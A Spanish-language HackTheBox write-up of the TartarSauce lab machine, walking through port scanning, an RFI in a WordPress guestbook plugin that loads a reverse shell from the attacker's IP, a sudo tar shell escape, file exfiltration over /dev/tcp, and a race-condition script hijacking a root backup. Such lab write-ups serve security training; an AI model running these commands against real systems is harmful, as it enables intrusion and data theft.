---
title: TartarSauce Writeup
author: 
date: 21-02-2023
categories: [HackTheBox, Machines Medium]
tags: [Writeup, Guías, HackTheBox,WordPress,Web,SUDO,RFI,GTFOBins]
pin: false
image:
  path: /assets/img/commons/TartarSauce/logo.png
  alt: TartarSauce WriteUp
---

**10.10.10.88 TartarSauce (medium machine)** Vengo a traer otra guía para esta máquina con dificultad media, tocando un Remote File Inclusion (RFI) donde nos permitirá apuntar a nuestro propio servidor y cargar una reverse shell aprovechandose de uno de los plugins que emplea WordPress, con un poco de scripting en bash

## Information Ghatering / ScanPorts

- Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.10.88 -oG allPorts 

```
-p-  -> escanearemos todos los rangos de puertos (65535)

-sS -> análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre de>

-vvv -> verbose para que mediante vayas descubriendo puertos se reporten en la terminal

--min-rate 2000 -> paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido

-n -> que no aplique resoluci+on de DNS para que no tarde el escaneo

-Pn -> ni que me detecte el descburimiento de hosts

```console
$ nmap -p-  --open -sS -vvv  --min-rate 5000 -n -Pn 10.10.10.88 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 22:32 CST
Initiating SYN Stealth Scan at 22:32
Scanning 10.10.10.88 [65535 ports]
Discovered open port 80/tcp on 10.10.10.88
Completed SYN Stealth Scan at 22:32, 13.19s elapsed (65535 total ports)
Nmap scan report for 10.10.10.88
Host is up, received user-set (0.071s latency).
Scanned at 2023-02-19 22:32:33 CST for 13s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
Raw packets sent: 65605 (2.887MB) | Rcvd: 65535 (2.621MB)
```
Observamos que solo tenemos el puerto 80 expuesto, ahora emplearé scripts para detectar versiones y servicios sobre ese puerto 

-sCV -> escaneo lanzando scripts que detecten servicios y versiones

-p -> especeficando los puertos a escanear

-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted

```console
$ nmap -sCV -p80 10.10.10.88 -oN targeted                                    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 22:36 CST
Nmap scan report for 10.10.10.88
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds
```
apreciamos un par de descubrimientos pero sinceramente no hay nada de importante en ello, por lo tanto procederé a indagar sobre el sitio web

![](/assets/img/commons/TartarSauce/web.png) 

y asi a simple viste sinceramente no se ve nada interesante... entonces comenzaré a fuzzear directorios con wfuzz
## BruteForce directory discovery
```console
$ wfuzz -c --hc=404 --hh=10766 -t 200 -w  /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.88/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.88/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000001967:   301        9 L      28 W       316 Ch      "webservices"                                                                                                                                                             
000004224:   404        9 L      32 W       278 Ch      "583"
```
![](/assets/img/commons/TartarSauce/web1.png)

y en ese directorio vemos un forbidden donde no podré hacer nada al respecto, seguiré fuzzeando esperando encontrar algo interesante

```console
$ wfuzz -c --hc=404,403 --hh=10766 -t 200 -w  /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.88/webservices/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000793:   301        9 L      28 W       319 Ch      "wp"                                                                                                                                                                      
000002532:   404        9 L      32 W       296 Ch      "learnmore"
```
vemos un directorio wp y ya me hace pensar en wordPress,normalmente están nombrados con esas siglas las extensiones de wordPress

![](/assets/img/commons/TartarSauce/web2.png)

y mirando el wappalyzer efectivamente emplea wordPress con una versión 4.9.4, si recordamos wordPress emplea una serie de plugins de los cuales puedes buscar y aprovecharte de alguna vulnerabilidad. Normalmente las rutas de WP se quedan guardadas en wp-content/plugins asi que tiraré de un diccionario ahora con gobuster para descubrir nuevos plugins

```console
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.10.88/webservices/wp 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.88/webservices/wp
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/19 23:12:22 Starting gobuster in directory enumeration mode
===============================================================
/wp-content/plugins/akismet/ (Status: 200) [Size: 0]
/wp-content/plugins/gwolle-gb/ (Status: 200) [Size: 0]
/wp-content/plugins/hello.php/ (Status: 500) [Size: 0]
/wp-content/plugins/hello.php (Status: 500) [Size: 0]
```
y tenemos 4 de los cuales 2 tenemos un status de 200, buscando vulnerabilidades vemos un RFI en el plugin gwolle-gb 
## WordPress Exploitation 
```console
 $ searchsploit gwolle             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                                                                                                          | php/webapps/38861.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
![](/assets/img/commons/TartarSauce/terminal.png) 

analizando el RFI vemos que seguido del plugin hay mas directorios para que al final podamos apuntar a un archivo de nuestro sistema, para comprobar esto primero me voy a crear un servidor con python3 apuntando a un archivo que no existe en mi directorio actual de trabajo
![](/assets/img/commons/TartarSauce/web3.png)

ahora veremos la petición del archivo test.php
![](/assets/img/commons/TartarSauce/terminal1.png) 
vemos que la petición por get **GET /test.phpwp-load.php** y en /test.php concatena una extensión con nombre wp-load.php, asi que no habrá necesidad de especificarle en la url el nombre del archivo, solo con nombrar nuestra reverse shell como wp-load.php el sistema interpretaria nuestro archivo, quedando de la siguiente forma   

```console
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/
```
> Como en la fase de reconocimiento vimos que el sitio web emplea php por ende todo aquel comando escrito en php será interpretado por el sistema

![](/assets/img/commons/TartarSauce/terminal2.png)

enviando la petición vemos que ya obtiene e interpreta nuestra reverse shell y ganamos una sh como www-data
![](/assets/img/commons/TartarSauce/terminal3.png)

![](/assets/img/commons/TartarSauce/terminal4.png)

**hacemos tratamiento de la tty**
```console
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@TartarSauce:/$ 
www-data@TartarSauce:/$ ^Z
zsh: suspended  nc -nlvp 443
                                                                                                                                                                                                                                    s$ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```
## Abusing Sudoers Privilege
si intentamos leer la flag del sistema vemos que no podemos ya que no tenemos los privilegios de onuma que es un usuario a nivel de sistema

```console
www-data@TartarSauce:/$ find /home \-name \*.txt 
find: '/home/onuma': Permission denied
```
si miramos con **sudo -l** podemos ver que binarios a nivel de sistema puede ejecutar onuma

```console
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```
mmmmmm...interesante que onuma pueda ejecutar tar, para esto me iré a [GTFOBins](https://gtfobins.github.io/) y ver como escalar nuestro privilegio como onuma, filtrando por tar vemos acceso a shell de varias formas
(https://gtfobins.github.io/gtfobins/tar/#shell)
intentaré con la primera solo que en lugar de una sh quiero tener la terminal en una bash
```console
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
ahora si ejecutamos tar como onuma  podremos tener la shell como el usuario onuma y ahora si leer nuestra primera flag:)

```console
www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
onuma@TartarSauce:/$ whoami
onuma
onuma@TartarSauce:/$ find /home \-name \*.txt | xargs cat
04891dd10bf444772c1ff79ef5ab2138
```
## Privilege Escalation - Post Exploitation 
Hasta este punto tuve que pasar linpeas y en la parte de procesos logre apreciar un backuper un poco extraño ya que dicha tarea no se estaba ejecutando como el usuario onuma eso me hace pensar que se ejecuta como root

![](/assets/img/commons/TartarSauce/terminal5.png)
y efectivamente vemos que se localiza en la carpeta sbin el script por lo tanto el propietario es root y la tarea que se ejcuta en cierto tiempo es de un root
```console
onuma@TartarSauce:/tmp$ ls -l /usr/sbin/backuperer
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
```
vamos a ver el script 
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```
en este punto analizaremos el script 
1. Elimina el directorio previamente extraído con /bin/rm -rf $tmpdir/.* $check
2. Realiza una copia de seguridad de la corriente $basedirdirectorio a /var/tmp/$RANDOM$con /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
3. Espera durante 30 segundos para permitir que se complete la copia de seguridad. 
4. Ejecuta el integrity_checkfunción, comprobando la corriente /var/www/html con lo previamente marcado /var/tmp/check/var/www/html.
Si los directorios son diferentes, imprime un mensaje de error en el registro y no elimina el /var/tmp/checkdirectorio _
Si los directorios coinciden, mueve el actual tarpaquete a /var/backups/onuma-www-dev.baky elimina el /var/tmp/checkdirectorio.

Podríamos aprovechar los 30 segundos del sleep comando para inyectar nuestro propio código en el archivo recién creado. Esto nos permitirá hacer algo como  usar index.html con un enlace simbólico a /root/root.txt. y obtener la flag 
comenzaré comprimiendo todo lo que hay en /var/www/html/
```console
$ onuma@TartarSauce:/dev/shm$ tar -zcvf comprimido.tar /var/www/html/
```
![](/assets/img/commons/TartarSauce/terminal6.png)

una vez comprimido lo pasamos a nuestro sistema

```console
$ onuma@TartarSauce:/dev/shm$ cat < comprimido.tar > /dev/tcp/10.10.14.6/443
```
nos ponemos con nc en modo escucha en espera de recibir archivo y tenemos el comprimido. Posteriormente lo descomprimimos con

```console
$ tar -zxvf comprimido.tar
```
![](/assets/img/commons/TartarSauce/terminal7.png)

y nos metemos a /var/wwww/html donde al index.html le crearemos un enlace símbolico a donde apunte a la flag del usuario root /root/root.txt *ln -s -f /root/root.txt index.html*

![](/assets/img/commons/TartarSauce/terminal8.png)

una vez creado el enlace simbolico, volvemos a comprimir el fichero pero ya con el enlace simbolico 

```console
$ tar -zcvf comprimido.tar var/www/html
```
ahora en la máquina victima vamos a descargarnos ese tar

```console
$ onuma@TartarSauce:/dev/shm$ wget http://10.10.14.6/comprimido.tar
--2023-02-21 11:46:59--  http://10.10.14.6/comprimido.tar
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11542354 (11M) [application/x-tar]
Saving to: 'comprimido.tar'

comprimido.tar                                             100%[=======================================================================================================================================>]  11.01M  1.05MB/s    in 9.3s    

2023-02-21 11:47:08 (1.18 MB/s) - 'comprimido.tar' saved [11542354/11542354]
```
una vez ya con el tar, nos creamos un pequeño script  para automatizar la tarea, donde jugando con expresiones regulares me agarre el valor del hash que crea el script de 40 carácteres, una vez que lo tenga, copiaré mi comprimido.tar donde tiene el enlace simbolico  a /var/tmp/$filename donde la variable $filename será el archivo que crea el script backuper, para que cuando verifique y haga el diferencial entre los dos archivos . se quede con mi comprimido.tar y me reporte la flag del sistema de root

```console
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!]Saliendo...\n"
	tput cnorm; exit 1
}

#Ctrl+C
trap ctrl_c INT

tput civis; while true; do
	filename="$(ls -la /var/tmp/ | grep -oP '\.\w{40}')"

	if [ "$filename" ]; then
		echo -e "\n[+] El archivo tiene nombre $filename\n"
		rm -f /var/tmp/$filename
		cp comprimido.tar /var/tmp/$filename
		echo -e "[+] El archivo ha sido secuestrado correctamente\n"
		tput cnorm; exit 0
	fi

done; tput cnorm
```
lo ejecutamos y vemos que ha sido agarrado el archivo que creo el script y se copio correctamente mi comprimido 

```console
onuma@TartarSauce:/dev/shm$ ./hijacking.sh 

[+] El archivo tiene nombre .cf01c0b5d9baa60163a9b0c7239fc6e6b6e28fd3

[+] El archivo ha sido secuestrado correctamente
```
ahora solo toca ver la parte de los logs del backup

```console
$ onuma@TartarSauce:/dev/shm$ cat /var/backups/onuma_backup_error.txt 
```
y logramos ver hasta abajo la flag de root

![](/assets/img/commons/TartarSauce/terminal9.png)





